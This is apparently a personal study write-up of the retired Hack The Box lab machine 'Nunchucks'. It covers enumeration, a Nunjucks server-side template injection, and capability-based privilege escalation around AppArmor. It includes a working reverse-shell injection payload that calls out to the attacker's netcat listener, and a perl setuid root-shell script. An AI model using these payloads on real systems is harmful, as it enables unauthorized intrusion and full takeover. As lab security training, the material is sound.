---
title: "Nunchucks HTB"
date: 2021-11-09T17:30:30
categories:
  - study
tags:
  - Linux
  - Web
  - NodeJS
  - SSTI
  - SUID
  - AppArmor
classes: wide
---

Nunchucks is a 7 day retired box, it is easy rated and it can be found [here.](https://app.hackthebox.com/machines/Nunchucks)

>*"Nunchucks is a easy machine that explores a NodeJS-based Server Side Template Injection (SSTI)."*

<h2> Enumeration</h2>

**Nmap scan results:**

```
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                            
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)                                                                        
| http-methods:                                                                                                                                                  
|_  Supported Methods: GET HEAD POST OPTIONS                                 
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                      
|_http-title: Did not follow redirect to https://nunchucks.htb/                                                                                                  
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)                                                                     
|_http-server-header: nginx/1.18.0 (Ubuntu)     
|_http-title: Nunchucks - Landing Page                                                                               
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
```

<h4>What is the scan telling us?</h4>

- Port 22 is open showing OpenSSH 8.2p1 on Ubuntu.
- Port 80 is open showing a nginx webserver.
- Port 443 shows ssl/http or https nginx webport.

We see the nunchucks.htb domain so we add it to our `/etc/hosts` file.

Navigating to the main page on port 443 and 80 we see: 

<img src="/assets/images/nunchucks/nunchuck0.PNG" alt="Different Vhost found.">

There is a registration and login page. However when we attempt to register or log in we get an error that logins and registrations are temporarily disabled.

**Gobuster:**
We use Gobuster's dir mode and find nothing of note, just things you can find navigating the site. 

However using vhost mode we find the following:

<img src="/assets/images/nunchucks/nunchuck1.PNG" alt="Different Vhost found.">

We add this to our `/etc/hosts` file and navigate to it.

<img src="/assets/images/nunchucks/nunchuck2.PNG" alt="https://store.nunchucks.htb">

From here we try to navigate through all the buttons and find that none of them link to any other page. However, inputting a test email shows that this site may be vulnerable to a Server-Side Template Injection (SSTI). 

<img src="/assets/images/nunchucks/nunchuck3.PNG" alt="Returns our email.">

<h4>What is an SSTI?</h4>

[Portswigger](https://portswigger.net/research/server-side-template-injection) explains SSTI as:

>*"Web applications frequently use template systems such as Twig and FreeMarker to embed dynamic content in web pages and emails. Template Injection occurs when user input is embedded in a template in an unsafe manner."*

We can test for an SSTI by submitting math to the server and seeing what is returned:

<img src="/assets/images/nunchucks/nunchuck4.PNG" alt="It's executing!">

The server has seen `7*7` and has returned 49 to us. It is executing what we give it, essentially an RCE.

<h2>Foothold</h2>

From here we have to understand what underlying template engine is running to see if there are any known vulns. We could test and devise our own manually but I'm not quiteeeeeee there yet.

Using Burpsuite to capture the email submission and seeing what the response is with repeater we see:

<img src="/assets/images/nunchucks/nunchuck5.PNG" alt="Powered by Express">

According to [wikipedia](https://en.wikipedia.org/wiki/Express.js), Express is:

>*"Express.js, or simply Express, is a back end web application framework for Node.js"* 

From here more googling leads us to a list of template engines usable by Express, including one named "Nunjucks".

We google for "Nunjucks SSTI" and find a nice [breakout guide](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine).

There exists a way to print `/etc/passwd`. Changing this to an email format and adding `\` between the double quotes to prevent errors:

<img src="/assets/images/nunchucks/nunchuck6.PNG" alt="Returns /etc/passwd">

Since we know this breakout works on this site we can now execute whatever we want! 

We startup our classic nc listener and find a reverse shell script to insert like so:

```
execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP YOURPORT >/tmp/f')\")()}}
```

We catch this shell, navigate to `/home/david` and see the `user.txt` right there:

<img src="/assets/images/nunchucks/nunchuck7.PNG" alt="User!">

<h2>Privilege Escalation</h2>

From here we notice that the box has a `SUID` tag on it, and run `getcap -r / 2>/dev/null` to find out what has what capabilities:

<img src="/assets/images/nunchucks/nunchuck8.PNG" alt="Good old setuid.">

We see `/usr/bin/perl = cap_setuid+ep` which we know from [Cap](https://moseskonsue.github.io/writeup/cap/) will allow us to escalate privileges. Checking [GTFObins](https://gtfobins.github.io/gtfobins/perl/) we see a one liner to give us root. 

However running it does... Nothing?

Being completely stuck I check out a great writeup from [0xdf](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html). Who explains that the reason why nothing is happening is because of [AppArmor](https://en.wikipedia.org/wiki/AppArmor), from wikipedia:

>*"AppArmor ("Application Armor") is a Linux kernel security module that allows the system administrator to restrict programs' capabilities with per-program profiles"*

AppArmor would have revealed itself if I attempted to run the perl one liner in a script instead. Returning the following:

```
Can't open perl script "x": Permission denied
```

0xdf points out that there is a known [bug](https://bugs.launchpad.net/apparmor/+bug/1911431). This bug means that AppArmor will prevent execution when the binary is invoked via path, but if it's invoked by a Shebang(#!) no such protection is offered.

This means we can create a script version of the one liner in `/tmp` that looks like:

```perl
#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);

exec "/bin/sh"
```

Which results in:

<img src="/assets/images/nunchucks/nunchuck9.PNG" alt="whoami">

We find the root flag in the usual `/root/root.txt`.


<img src="/assets/images/nunchucks/nunchuck10.PNG" alt="Nice!">


<h4>For next time:</h4>

- The presence of one domain name suggests the possibility of others existing, use Gobuster vhost to discover others.
- Figure out a good workflow for testing sites for OWASP top 10 vulns. {{7/7}} etc. 



